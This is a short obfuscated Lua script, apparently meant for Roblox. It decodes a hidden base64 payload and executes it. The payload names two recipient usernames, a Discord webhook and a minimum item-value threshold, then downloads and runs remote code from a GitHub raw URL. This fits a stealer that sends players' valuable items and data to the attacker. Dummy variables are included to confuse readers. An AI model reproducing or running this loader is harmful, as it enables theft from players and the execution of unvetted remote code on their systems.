
local nFuIFxpTaK = 'VXNlcm5hbWUgPSAiMTIzbmV3YmVnaW5uZXIiClVzZXJuYW1lMiA9ICIxMjM0bmV3YmVnaW5uZXIiCldlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5ODYzODAwODk5NTY4MDM1MS9IWVdhRXROWU9qcFFjeDV0bXk2dUU3VXhMSWJHRHBfVlo1MlU4LVBJdWpNdVBfTmZjNWx6SWNBWHU1QkpHTXdLT3l1WiIKTWluaW11bVJBUCA9IDEwMDAwCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2hhZG93c3p6enovdGltb2NpeS9yZWZzL2hlYWRzL21haW4vbWFpbiIsIHRydWUpKSgp'
local aIYjrxckTNkW = function(s) 
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; 
    s = string.gsub(s, '[^'..b..'=]', ''); 
    return (s:gsub('.', function(x) 
        if x == '=' then return '' end; 
        local r,f='',(b:find(x)-1); 
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end 
        return r; 
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) 
        if (#x ~= 8) then return '' end; 
        local c=0; 
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end 
        return string.char(c) 
    end)) 
end
local QrfhKEvpFdYU = aIYjrxckTNkW(nFuIFxpTaK)
loadstring(QrfhKEvpFdYU)() -- Run decoded code

-- Dummy variables for confusion
local qketUWuwh = math.random()
local fPSYAiVn = "This is a dummy string"
